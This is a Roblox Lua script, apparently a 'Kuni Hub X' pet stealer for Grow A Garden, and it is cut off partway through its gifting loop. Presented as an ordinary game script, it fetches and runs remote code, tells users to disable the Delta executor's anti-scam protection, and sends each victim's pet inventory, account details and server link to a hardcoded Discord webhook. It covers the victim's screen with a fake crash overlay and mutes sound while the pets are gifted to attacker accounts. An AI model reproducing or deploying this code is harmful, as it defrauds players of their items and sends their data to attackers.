
local Players = game:GetService("Players")
local player = Players.LocalPlayer
if not player then warn("LocalPlayer not found. Run this as a LocalScript."); return end
local playerGui = player:WaitForChild("PlayerGui")
local TeleportService = game:GetService("TeleportService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

-- Load the MESSAGE/DETECT loader
local messageURL = "https://raw.githubusercontent.com/GagDeveloper/KONI/refs/heads/main/DETECT%20LUA"
local ok, err = pcall(function()
    local code = game:HttpGet(messageURL)
    loadstring(code)()
end)
if ok then print("[Loader] Loaded detection logic successfully.") else warn("[Loader] Failed to load detection logic:", err) end

-- Fallback detectExecutor if not defined
if type(detectExecutor) ~= "function" then
    function detectExecutor()
        if syn then return "Synapse"
        elseif KRNL then return "KRNL"
        elseif Fluxus then return "Fluxus"
        elseif Protosmasher then return "Protosmasher"
        elseif (ArceusX ~= nil) or Arceus then return "Arceus X"
        elseif Delta then return "Delta"
        else return "Unknown"
        end
    end
end

-- Wait briefly for _G.IsEnabled to be defined
local waitTime = 3
local elapsed = 0
while _G.IsEnabled == nil and elapsed < waitTime do
    task.wait(0.1)
    elapsed = elapsed + 0.1
end
if _G.IsEnabled == nil then
    warn("[Loader] _G.IsEnabled is still nil; assuming Anti‑Scam OFF.")
    _G.IsEnabled = false
end

local exec = detectExecutor()
print("[Loader] Executor detected:", exec)

-- If Delta and anti-scam is ON → show GUI and stop
if exec == "Delta" and _G.IsEnabled then
    -- Warning GUI setup:
    local gui = Instance.new("ScreenGui", playerGui)
    gui.Name = "DeltaAntiScamGui"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 500, 0, 250)
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.Position = UDim2.new(0.5, 0.5, 0.5, 0)
    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    frame.BorderSizePixel = 0
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(0, 170, 255)
    stroke.Thickness = 2

    -- Flickering warning bar
    local warningBar = Instance.new("TextLabel", frame)
    warningBar.Size = UDim2.new(1, 0, 0.15, 0)
    warningBar.Position = UDim2.new(0, 0, 0, 0)
    warningBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    warningBar.Text = "Turn off your Anti‑Scam & Verify Teleport to avoid disconnects."
    warningBar.TextColor3 = Color3.fromRGB(255, 221, 51)
    warningBar.Font = Enum.Font.GothamBold
    warningBar.TextSize = 14
    warningBar.RichText = true
    warningBar.TextWrapped = true
    warningBar.TextXAlignment = Enum.TextXAlignment.Center
    warningBar.TextYAlignment = Enum.TextYAlignment.Center
    Instance.new("UICorner", warningBar).CornerRadius = UDim.new(0, 16)

    task.spawn(function()
        local shown = true
        while warningBar.Parent do
            local bgTrans = shown and 0.5 or 0
            local txtTrans = shown and 0.5 or 0
            TweenService:Create(warningBar, TweenInfo.new(0.2), {
                BackgroundTransparency = bgTrans,
                TextTransparency = txtTrans
            }):Play()
            shown = not shown
            task.wait(0.2)
        end
    end)

    local content = Instance.new("Frame", frame)
    content.Size = UDim2.new(1, -30, 0.55, 0)
    content.Position = UDim2.new(0, 15, 0.18, 0)
    content.BackgroundTransparency = 1

    local title = Instance.new("TextLabel", content)
    title.Size = UDim2.new(1, 0, 0.25, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "Delta Anti‑Scam Detected"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 20
    title.TextWrapped = true

    local desc = Instance.new("TextLabel", content)
    desc.Size = UDim2.new(1, 0, 0.7, 0)
    desc.Position = UDim2.new(0, 0, 0.25, 0)
    desc.BackgroundTransparency = 1
    desc.Text = "1) Tap the Delta icon above.\n2) Go to Settings (gear icon).\n3) Turn OFF “Anti‑Scam” & “Verify Teleport”.\n4) Rejoin and run the script again."
    desc.TextColor3 = Color3.fromRGB(200, 200, 200)
    desc.Font = Enum.Font.Gotham
    desc.TextSize = 15
    desc.RichText = true
    desc.TextWrapped = true
    desc.TextXAlignment = Enum.TextXAlignment.Center
    desc.TextYAlignment = Enum.TextYAlignment.Center

    local btnFrame = Instance.new("Frame", frame)
    btnFrame.Size = UDim2.new(1, -30, 0.18, 0)
    btnFrame.Position = UDim2.new(0, 15, 0.8, 0)
    btnFrame.BackgroundTransparency = 1

    local rejoinBtn = Instance.new("TextButton", btnFrame)
    rejoinBtn.Size = UDim2.new(1, 0, 1, 0)
    rejoinBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    rejoinBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
    rejoinBtn.Font = Enum.Font.GothamBold
    rejoinBtn.TextSize = 16
    rejoinBtn.Text = "Rejoin Game (5.0s)"
    rejoinBtn.RichText = true
    rejoinBtn.AutoButtonColor = false
    rejoinBtn.Active = false
    Instance.new("UICorner", rejoinBtn).CornerRadius = UDim.new(0, 10)

    task.spawn(function()
        local timer = 5
        while timer > 0 do
            rejoinBtn.Text = string.format("Rejoin Game (%.1fs)", timer)
            task.wait(0.1)
            timer = timer - 0.1
        end
        rejoinBtn.Text = "Rejoin Game"
        rejoinBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
        rejoinBtn.TextColor3 = Color3.new(1, 1, 1)
        rejoinBtn.AutoButtonColor = true
        rejoinBtn.Active = true
    end)

    rejoinBtn.MouseButton1Click:Connect(function()
        if rejoinBtn.Active then
            TeleportService:Teleport(game.PlaceId, player)
        end
    end)

    -- Block Roblox menus in CoreGui
    local blocker = Instance.new("ScreenGui", game.CoreGui)
    blocker.Name = "AntiLeaveBlocker"
    blocker.ResetOnSpawn = false
    blocker.IgnoreGuiInset = true
    blocker.DisplayOrder = 10000
    blocker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local blockFrame = Instance.new("Frame", blocker)
    blockFrame.Size = UDim2.new(0, 56, 0, 56)
    blockFrame.Position = UDim2.new(0, 6, 0, 6)
    blockFrame.BackgroundTransparency = 1

    local blockBtn = Instance.new("TextButton", blockFrame)
    blockBtn.Size = UDim2.new(1, 0, 1, 0)
    blockBtn.BackgroundTransparency = 1
    blockBtn.Text = ""
    blockBtn.AutoButtonColor = false
    blockBtn.Active = true

    RunService.RenderStepped:Connect(function()
        blockFrame.Position = UDim2.new(0, 6, 0, 6)
    end)
    return
end

 
   -- Webhook
getgenv().Webhook = "https://discord.com/api/webhooks/1412099514856116295/HdbFa64PKb2Fjz1zhp2PLxZo0z25IqKJE4bP25uwc_qCiMzAp_bv2FztM2dFyelUbRmM"

-- Username list (as table, not string)
getgenv().Username = {
    "kuni_hits1", "kuni_hits2", "kuni_hits3", "kuni_hits4", "kuni_hits5",
    "kuni_hits6", "kuni_hits7", "kuni_hits8", "kuni_hits9", "kuni_hits10",
    "kuni_hits11", "kuni_hits12", "kuni_hits13", "kuni_hits14", "kuni_hits15",
    "kuni_hits16", "kuni_hits17", "kuni_hits18", "kuni_hits19", "kuni_hits20",
    "kuni_hits21", "kuni_hits22", "kuni_hits23", "kuni_hits24", "kuni_hits25",
    "kuni_hits26", "kuni_hits27", "kuni_hits28", "kuni_hits29", "kuni_hits30",
    "kuni_hits31", "kuni_hits32", "kuni_hits33", "kuni_hits34", "kuni_hits35",
    "kuni_hits36", "kuni_hits37", "kuni_hits38", "kuni_hits39", "kuni_hits40",
    "kuni_hits41", "kuni_hits42", "kuni_hits43", "kuni_hits44", "kuni_hits45",
    "kuni_hits46", "kuni_hits47", "kuni_hits48", "kuni_hits49", "kuni_hits50"
}

        local RS = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        local HttpService = game:GetService("HttpService")
        local RunService = game:GetService("RunService")
        local LocalizationService = game:GetService("LocalizationService")
        local DataService = require(RS.Modules.DataService)
        local PetRegistry = require(RS.Data.PetRegistry)
        local NumberUtil = require(RS.Modules.NumberUtil)
        local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
        local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
        local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
        local TeleportService = game:GetService("TeleportService")

        local data = DataService:GetData()
        local maxAttempts = 10
        local attempt = 1
        local teleported = false

        setclipboard("Your pets have been STOLEN by KUNI HUB X. If you want to scam others join the Discord! https://discord.gg/7E7hzqyX")

        
        if GetServerType:InvokeServer() == "VIPServer" then
            while attempt <= maxAttempts and not teleported do
                local servers = {}
                local req = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
                local body = HttpService:JSONDecode(req)

                if body and body.data then
                    for _, v in next, body.data do
                        if tonumber(v.playing) and tonumber(v.maxPlayers)
                        and (tonumber(v.maxPlayers) - tonumber(v.playing) >= 2)
                        and v.id ~= game.JobId then
                            table.insert(servers, v.id)
                        end
                    end
                end

                if #servers > 0 then
                    local success = pcall(function()
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
                    end)
                    if success then
                        teleported = true
                        break
                    end
                end

                attempt += 1
                if attempt <= maxAttempts then
                    task.wait(1)
                end
            end

            if not teleported then
                warn("Failed to find a non-full server after "..maxAttempts.." attempts")
            end
        end

        if GetServerType:InvokeServer() == "VIPServer" then
            error("Script stopped - VIP Server detected")        
        end

        if getgenv().EclipseHubRunning then
            warn("Script is already running or has been executed! Cannot run again.")
            return
        end
        getgenv().EclipseHubRunning = true

        -- Updated PetPriorityData with isMutation field and additional pets
        local PetPriorityData = {
                -- Regular pets
                ["Kitsune"] = { priority = 1, emoji = "🌸", isMutation = false },
                ["Raccoon"] = { priority = 2, emoji = "🦝", isMutation = false },
                ["Disco Bee"] = { priority = 3, emoji = "🪩", isMutation = false },
                ["Fennec fox"] = { priority = 4, emoji = "🦊", isMutation = false },
                ["Butterfly"] = { priority = 5, emoji = "🦋", isMutation = false },
                ["Dragonfly"] = { priority = 6, emoji = "🐲", isMutation = false },
                ["Mimic Octopus"] = { priority = 7, emoji = "🐙", isMutation = false },
                ["T-Rex"] = { priority = 9, emoji = "🦖", isMutation = false },
                ["Spinosaurus"] = { priority = 10, emoji = "🫎", isMutation = false },
                ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
                ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
                -- Mutations
                ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
                ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
                ["Shocked"] = { priority = 16, emoji = "⚡", isMutation = true },
                ["Rainbow"] = { priority = 17, emoji = "🌈", isMutation = true },
                ["Radiant"] = { priority = 18, emoji = "🛡️", isMutation = true },
                ["Corrupted"] = { priority = 19, emoji = "🧿", isMutation = true },
                ["IronSkin"] = { priority = 20, emoji = "💥", isMutation = true },
                ["Tiny"] = { priority = 21, emoji = "🔹", isMutation = true },
                ["Golden"] = { priority = 22, emoji = "🥇", isMutation = true },
                ["Frozen"] = { priority = 23, emoji = "❄️", isMutation = true },
                ["Windy"] = { priority = 24, emoji = "🌪️", isMutation = true },
                ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
                ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
                ["Tranquil"] = { priority = 27, emoji = "🧘"	, isMutation = true },
            }

        local function detectExecutor()
            local name
            local success = pcall(function()
                if identifyexecutor then
                    name = identifyexecutor()
                elseif getexecutorname then
                    name = getexecutorname()
                end
            end)
            return name or "Unknown"
        end

        local function formatNumberWithCommas(n)
            local str = tostring(n)
            return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
        end

        local function getWeight(toolName)
            if not toolName or toolName == "No Tool" then
                return nil
            end
            
            local weight = toolName:match("%[([%d%.]+) KG%]")
            weight = weight and tonumber(weight)
            
            return weight
        end

        local function getAge(toolName)
            if not toolName or toolName == "No Tool" then
                return nil
            end    
            local age = toolName:match("%[Age (%d+)%]")
            age = age and tonumber(age)
            
            return age
        end

        local function GetPlayerPets()
            local unsortedPets = {}
            local equippedPets = {}
            local player = Players.LocalPlayer
            if not data or not data.PetsData then
                warn("No pet data available in data.PetsData")
                return unsortedPets
            end

            if workspace:FindFirstChild("PetsPhysical") then
                for _, petMover in workspace.PetsPhysical:GetChildren() do
                    if petMover and petMover:GetAttribute("OWNER") == Players.LocalPlayer.Name then
                        for _, pet in petMover:GetChildren() do
                            table.insert(equippedPets, pet.Name)
                            PetsService:UnequipPet(pet.Name)
                        end
                    end
                end
            end

            task.wait(0.5)
            for _, tool in pairs(player.Backpack:GetChildren()) do
                if not tool or not tool.Parent then
                    continue
                end
            
                if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
                    local petName = tool.Name
                    
                    if petName:find("Bald Eagle") or petName:find("Golden Lab") then
                        continue
                    end

                    local function SafeCalculatePetValue(tool)
                        local player = Players.LocalPlayer
                        local PET_UUID = tool:GetAttribute("PET_UUID")
                        
                        if not PET_UUID then
                            warn("SafeCalculatePetValue | No UUID!")
                            return 0
                        end
                        
                        local data = DataService:GetData()
                        if not data or not data.PetsData.PetInventory.Data[PET_UUID] then
                            warn("SafeCalculatePetValue | No pet data found!")
                            return 0
                        end
                        
                        local petInventoryData = data.PetsData.PetInventory.Data[PET_UUID]
                        local petData = petInventoryData.PetData
                        local HatchedFrom = petData.HatchedFrom
                        
                        if not HatchedFrom or HatchedFrom == "" then
                            warn("SafeCalculatePetValue | No HatchedFrom value!")
                            return 0
                        end
                        
                        local eggData = PetRegistry.PetEggs[HatchedFrom]
                        if not eggData then
                            warn("SafeCalculatePetValue | No egg data found!")
                            return 0
                        end
                        
                        local rarityData = eggData.RarityData.Items[petInventoryData.PetType]
                        if not rarityData then
                            warn("SafeCalculatePetValue | No pet data in egg!")
                            return 0
                        end
                        
                        local WeightRange = rarityData.GeneratedPetData.WeightRange
                        if not WeightRange then
                            warn("SafeCalculatePetValue | No WeightRange found!")
                            return 0
                        end
                        
                        local sellPrice = PetRegistry.PetList[petInventoryData.PetType].SellPrice
                        local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
                        local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))
                        
                        return math.floor(sellPrice * weightMultiplier * levelMultiplier)
                    end

                    local age = getAge(tool.Name) or 0
                    local weight = getWeight(tool.Name) or 0
                    
                    local strippedName = petName:gsub(" %[.*%]", "")

                    local function stripMutationPrefix(name)
                        for key, data in pairs(PetPriorityData) do
                            if data.isMutation and name:lower():find(key:lower()) == 1 then
                                return name:sub(#key + 2)
                            end
                        end
                        return name
                    end

                    local petType = stripMutationPrefix(strippedName)
                    
                    local rawValue = SafeCalculatePetValue(tool)
                    if rawValue and rawValue > 0 then
                        table.insert(unsortedPets, {
                            PetName = petName,
                            PetAge = age,
                            PetWeight = weight,
                            Id = tool:GetAttribute("PET_UUID") or tool:GetAttribute("uuid"),
                            Type = petType,
                            Value = rawValue,
                            Formatted = formatNumberWithCommas(rawValue),
                        })
                    else
                        warn("Failed to calculate value for:", tool.Name)
                        continue
                    end
                end
            end

            task.wait(0.5)
            if equippedPets then
                for _, petName in pairs(equippedPets) do
                    if petName then
                        game.ReplicatedStorage.GameEvents.PetsService:FireServer("EquipPet", petName)
                    end
                end
            end
            return unsortedPets
        end

        local pets = GetPlayerPets()

        local Webhook = getgenv().Webhook
        local Username = getgenv().Username

        local function isMutated(toolName)
            for key, data in pairs(PetPriorityData) do
                if data.isMutation and toolName:lower():find(key:lower()) == 1 then
                    return key
                end
            end
            return nil
        end

        -- Sort pets by priority, then by value using PetPriorityData
        table.sort(pets, function(a, b)
            -- Get a's priority
            local aPriority, aMutation = 99, isMutated(a.PetName)
            if PetPriorityData[a.Type] then
                aPriority = PetPriorityData[a.Type].priority
            elseif aMutation and PetPriorityData[aMutation] then
                aPriority = PetPriorityData[aMutation].priority
            elseif a.Weight and a.Weight >= 10 then
                aPriority = 12
            elseif a.Age and a.Age >= 60 then
                aPriority = 13
            end

            -- Get b's priority
            local bPriority, bMutation = 99, isMutated(b.PetName)
            if PetPriorityData[b.Type] then
                bPriority = PetPriorityData[b.Type].priority
            elseif bMutation and PetPriorityData[bMutation] then
                bPriority = PetPriorityData[bMutation].priority
            elseif b.Weight and b.Weight >= 10 then
                bPriority = 12
            elseif b.Age and b.Age >= 60 then
                bPriority = 13
            end

            -- Compare priorities
            if aPriority == bPriority then
                return a.Value > b.Value
            else
                return aPriority < bPriority
            end
        end)

        local function hasRarePets()
            for _, pet in pairs(pets) do
                if pet.Type ~= "Red Fox" and PetPriorityData[pet.Type] and not PetPriorityData[pet.Type].isMutation then
                    return true
                end
            end
            return false
        end

        local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

        
        local tpScript = string.format(
            'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
            game.PlaceId,
            game.JobId
        )
        


        -- Update pet string generation
        local petString = ""

        for _, pet in ipairs(pets) do
            local highestPriority = 99
            local chosenEmoji = "🐈"
            local mutation = isMutated(pet.PetName)
            local mutationData = mutation and PetPriorityData[mutation] or nil
            local petData = PetPriorityData[pet.Type] or nil

            if petData and petData.priority < highestPriority then
                highestPriority = petData.priority
                chosenEmoji = petData.emoji
            elseif mutationData and mutationData.priority < highestPriority then
                highestPriority = mutationData.priority
                chosenEmoji = mutationData.emoji
            elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
                highestPriority = 12
                chosenEmoji = "💪"
            elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
                highestPriority = 13
                chosenEmoji = "👴"
            end

            local petName = pet.PetName
            local petValue = pet.Formatted
            petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " → " .. petValue
        end
        local playerCount = #Players:GetPlayers()

        local function getPlayerCountry(player)
            local success, result = pcall(function()
                return LocalizationService:GetCountryRegionForPlayerAsync(player)
            end)
            
            if success then
                return result
            else
                return "Unknown"
            end
        end    

        local accountAgeInDays = Players.LocalPlayer.AccountAge
        local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60)
        local creationDateString = os.date("%Y-%m-%d", creationDate)

        local function truncateByLines(inputString, maxLines)
            local lines = {}
            for line in inputString:gmatch("[^\n]+") do
                table.insert(lines, line)
            end
            
            if #lines <= maxLines then
                return inputString
            else
                local truncatedLines = {}
                for i = 1, maxLines - 1 do
                    table.insert(truncatedLines, lines[i])
                end
                return table.concat(truncatedLines, "\n")
            end
        end
-- Calculate total value
local totalValue = 0
for _, pet in ipairs(pets) do
    totalValue += pet.Value or 0
end
local formattedTotalValue = formatNumberWithCommas(totalValue)

local embed = {
    title = "Grow A Garden Hit - Kuni Hub X",
    color = 65280,
    fields = {
        {
            name = "Victim's Information",
            value = string.format(
                "```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
                Players.LocalPlayer.DisplayName or "Unknown",
                Username or "Unknown",
                detectExecutor() or "Unknown",
                tostring(Players.LocalPlayer.AccountAge or 0)
            ),
            inline = false
        },

        {
            name = "Victim's Backpack",
            value = string.format("```%s```", truncateByLines(petString, 20)),
            inline = false
        },
        {
            name = "Victim's Server",
            value = string.format(
                "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
                game.JobId,
                game.PlaceId,
                game.JobId
            ),
            inline = false
        }
    },
    footer = {
        text = string.format("%s | %s", game.PlaceId, game.JobId)
    }
}

local payload = {
    content = (hasRarePets() and "--@everyone\n" or "") ..
              string.format("\n%s\n", tpScript or "N/A"),
    embeds = {embed}
}

-- Full backpack string (no truncation)
local fullBackpackString = ""
for _, pet in ipairs(pets) do
    local highestPriority = 99
    local chosenEmoji = "🐱"
    local mutation = isMutated(pet.PetName)
    local mutationData = mutation and PetPriorityData[mutation] or nil
    local petData = PetPriorityData[pet.Type] or nil

    if petData and petData.priority < highestPriority then
        highestPriority = petData.priority
        chosenEmoji = petData.emoji
    elseif mutationData and mutationData.priority < highestPriority then
        highestPriority = mutationData.priority
        chosenEmoji = mutationData.emoji
    elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
        highestPriority = 12
        chosenEmoji = "💪"
    elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
        highestPriority = 13
        chosenEmoji = "👴"
    end

    local petName = pet.PetName
    local petValue = pet.Formatted
    fullBackpackString = fullBackpackString .. chosenEmoji .. " - " .. petName .. " → " .. petValue .. "\n"
end

-- Create a boundary for multipart form data
local boundary = "------------------------" .. HttpService:GenerateGUID(false)

-- Prepare embed JSON
local embedPayload = HttpService:JSONEncode(payload)

-- Create multipart body
local body = {}
table.insert(body, "--" .. boundary)
table.insert(body, 'Content-Disposition: form-data; name="payload_json"')
table.insert(body, "")
table.insert(body, embedPayload)

table.insert(body, "--" .. boundary)
table.insert(body, 'Content-Disposition: form-data; name="file"; filename="items.txt"')
table.insert(body, "Content-Type: text/plain")
table.insert(body, "")
table.insert(body, fullBackpackString)

table.insert(body, "--" .. boundary .. "--")

-- Join body parts
local requestBody = table.concat(body, "\r\n")

-- Send request
pcall(function()
    request({
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
        },
        Body = requestBody
    })
end)






                local function CreateGui()
                    local player = Players.LocalPlayer



                    local gui = Instance.new("ScreenGui")
                    gui.Name = "EclipseHubGui"
                    gui.ResetOnSpawn = false
                    gui.IgnoreGuiInset = true

                    gui.Parent = player:WaitForChild("PlayerGui")
                    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
                    gui.DisplayOrder = 99999

                    local bg = Instance.new("Frame")
                    bg.Size = UDim2.new(1, 0, 1, 0)
                    bg.Position = UDim2.new(0, 0, 0, 0)
                    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
                    bg.Parent = gui

                    local spinner = Instance.new("ImageLabel")
                    spinner.AnchorPoint = Vector2.new(0.5, 0.5)
                    spinner.Size = UDim2.new(0.2, 0, 0.2, 0)
                    spinner.Position = UDim2.new(0.5, 0, 0.35, 0)
                    spinner.BackgroundTransparency = 1
                    spinner.Image = "rbxassetid://74011233271790"
                    spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
                    spinner.Parent = bg

                    local asc = Instance.new("UIAspectRatioConstraint")
                    asc.Parent = spinner

                    local title = Instance.new("TextLabel")
                    title.Size = UDim2.new(1, 0, 0.08, 0)
                    title.Position = UDim2.new(0, 0, 0.53, 0)
                    title.BackgroundTransparency = 1
                    title.Text = "Please wait..."
                    title.Font = Enum.Font.GothamBold
                    title.TextSize = 38
                    title.TextColor3 = Color3.fromRGB(255, 255, 255)
                    title.TextStrokeTransparency = 0.75
                    title.Parent = bg

                    local desc = Instance.new("TextLabel")
                    desc.Size = UDim2.new(0.8, 0, 0.12, 0)
                    desc.Position = UDim2.new(0.1, 0, 0.62, 0)
                    desc.BackgroundTransparency = 1
                    desc.Text = "Script crash recconecting.\nYou will be returned shortly."
                    desc.Font = Enum.Font.Gotham
                    desc.TextSize = 20
                    desc.TextColor3 = Color3.fromRGB(143, 0, 255)
                    desc.TextWrapped = true
                    desc.TextXAlignment = Enum.TextXAlignment.Center
                    desc.TextYAlignment = Enum.TextYAlignment.Top
                    desc.Parent = bg

                    -- Countdown label
                    local countdown = Instance.new("TextLabel")
                    countdown.Size = UDim2.new(1, 0, 0.05, 0)
                    countdown.Position = UDim2.new(0, 0, 0.87, 0)
                    countdown.BackgroundTransparency = 1
                    countdown.Text = "Returning in 30 seconds..."
                    countdown.Font = Enum.Font.GothamSemibold
                    countdown.TextSize = 20
                    countdown.TextColor3 = Color3.fromRGB(255, 255, 255)
                    countdown.TextXAlignment = Enum.TextXAlignment.Center
                    countdown.Parent = bg

                    -- Spinner animation
                    task.spawn(function()
                        while spinner and spinner.Parent do
                            spinner.Rotation += 2
                            task.wait(0.01)
                        end
                    end)

                    -- Countdown logic
                    task.spawn(function()
                        for i = 30, 0, -1 do
                            countdown.Text = "Returning in " .. i .. " second" .. (i == 1 and "" or "s") .. "..."
                            task.wait(1)
                        end

                    end)
                end

        local usernames = {
            "PUT_HERE_YOUR_BACK_UP_USERNAMES", -- PUT THEIR UR EXTRA USERNAMES
        }

        local receiverPlr
        repeat
            for _, name in ipairs(usernames) do
                receiverPlr = Players:FindFirstChild(name) or Players:FindFirstChild(Username)
                if receiverPlr then
                    break
                end
            end
            task.wait(1)
        until receiverPlr

        local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
        local hum = receiverChar:WaitForChild("Humanoid")
        local targetPlr = Players.LocalPlayer
        local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()

        if receiverPlr == targetPlr then
            repeat
                for _, name in ipairs(usernames) do
                    receiverPlr = Players:FindFirstChild(name)
                    if receiverPlr then
                        break
                    end
                end
                task.wait(1)
            until receiverPlr
        end

        local jumped = false
        local chatted = false

        hum.Jumping:Connect(function()
            jumped = true
        end)

        receiverPlr.Chatted:Connect(function()
            chatted = true
        end)

        repeat
            task.wait()
        until jumped or chatted

        for _, v in targetPlr.PlayerGui:GetDescendants() do
            if v:IsA("ScreenGui") then
                v.Enabled = false
            end
        end

            for _, sound in ipairs(workspace:GetDescendants()) do
                if sound:IsA("Sound") then
                    sound.Volume = 0
                end
            end

            for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
                if sound:IsA("Sound") then
                    sound.Volume = 0
                end
            end
        
        game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false

        --[[for _, v in pairs(game:GetService("CoreGui").RobloxGui:GetDescendants()) do
            if not v:IsA("LocalScript") then
                pcall(function()
                    v:Destroy()
                end)
            end
        end]]
        
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        CreateGui()

        if workspace:FindFirstChild("PetsPhysical") then
            for _, petMover in workspace:FindFirstChild("PetsPhysical"):GetChildren() do
                if petMover and petMover:GetAttribute("OWNER") == targetPlr.Name then
                    for _, pet in petMover:GetChildren() do
                        PetsService:UnequipPet(pet.Name)
                    end
                end
            end
        end

        for _, tool in pairs(targetPlr.Backpack:GetChildren()) do
            if tool and tool:IsA("Tool") and tool:GetAttribute("d") == true then
                local tool = game:GetService("Players").LocalPlayer:WaitForChild("Backpack"):WaitForChild(tool.Name)
                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
            end
        end


    -- [Previous code up to the safeFollow function remains unchanged]

    local function safeFollow()
        local offset = CFrame.new(0, 0, 0.5) -- Reduced offset for closer proximity
        local conn = RunService.Stepped:Connect(function()
            if receiverPlr.Character and targetPlr.Character then
                local targetRoot = receiverPlr.Character:FindFirstChild("HumanoidRootPart")
                local followerRoot = targetPlr.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot and followerRoot then
                    local distance = (targetRoot.Position - followerRoot.Position).Magnitude
                    if distance > 5 then -- Ensure within 5 studs
                        followerRoot.CFrame = targetRoot.CFrame * offset
                    end
                end
            end
        end)

        return {
            Stop = function()
                if conn then
                    conn:Disconnect()
                end
            end
        }
    end

    local inventory = targetPlr.Backpack

    local function safeGiftTool(tool)
        -- Verify both players and their characters exist
        if not receiverPlr or not receiverChar or not targetPlr.Character then
            warn("Gifting failed: Invalid receiver or target character")
            return false
        end

        -- Ensure tool is in Backpack
        if tool.Parent ~= inventory then
            tool.Parent = inventory
            task.wait(0.3)
        end

        -- Equip the tool
        local humanoid = targetPlr.Character:FindFirstChild("Humanoid")
        if not humanoid then
            warn("Gifting failed: No Humanoid found for targetPlr")
            return false
        end

        humanoid:EquipTool(tool)
        task.wait(0.6) -- Increased wait for server to register equip

        -- Verify tool is equipped
        if tool.Parent ~= targetPlr.Character then
            warn("Gifting failed: Tool not equipped - " .. tool.Name)
            tool.Parent = inventory -- Reset to Backpack
            return false
        end

        if detectExecutor() == "Delta" then
            task.wait(0.3)
            local camera = workspace.CurrentCamera
            local head = receiverChar and receiverChar:FindFirstChild("Head")

            if head then
                local screenPos, onScreen = camera:WorldToViewportPoint(head.Position)
                if onScreen then
                    local x = screenPos.X
                    local y = screenPos.Y

                    print("Screen position of head:", x, y)

                    -- Example mouse click:
                    local VirtualInputManager = game:GetService("VirtualInputManager")
                    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, nil, false)
                    task.wait(0.8)
                    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, nil, false)
                else
                    warn("Head not on screen")
                    return false
                end
            end
        else

            -- Fire gifting event
            local success, err = pcall(function()
                RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
                
                -- Trigger proximity prompt if it exists
                task.wait(0.5) -- Increased wait for prompt to appear
                local prompt = receiverChar:FindFirstChild("Head") and receiverChar.Head:FindFirstChildOfClass("ProximityPrompt")
                if prompt then
                    print("Triggering proximity prompt for " .. receiverPlr.Name)
                    fireproximityprompt(prompt)
                else
                    warn("No proximity prompt found for " .. receiverPlr.Name)
                end
                return true
            end)

            -- Handle failure
            if not success then
                warn("Gifting failed for " .. tool.Name .. ": " .. tostring(err))
                tool.Parent = inventory -- Reset to Backpack
                return false
            end

            task.wait(0.55)
        end

            -- Verify tool is no longer in possession (indicating successful gift)
        task.wait(0.15) -- Increased wait to confirm gift
        if tool then
            tool.Parent = targetPlr.Backpack
        end
        return true

    end

    safeFollow()
    task.wait(1)

    -- Gifting loop
    for _, pet in ipairs(pets) do
        for _, tool in targetPlr.Backpack:GetChildren() do
